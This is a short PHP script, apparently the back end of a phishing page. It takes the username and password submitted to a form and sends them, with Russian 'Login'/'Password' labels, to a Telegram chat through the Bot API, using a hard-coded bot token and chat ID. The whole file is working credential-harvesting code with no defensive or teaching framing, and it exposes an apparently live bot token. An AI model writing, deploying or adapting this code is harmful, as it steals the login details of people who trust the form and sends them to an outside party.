<?php
$botToken = "8936109894:AAEiOeYAp-dOl2PDKRxQ606SabiXnu-qRC0";
$chatID = "494889330";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['username'];
    $pass = $_POST['password'];
    $message = "Логин: " . $user . "\nПароль: " . $pass;
    file_get_contents("https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatID . "&text=" . urlencode($message));
}
?>
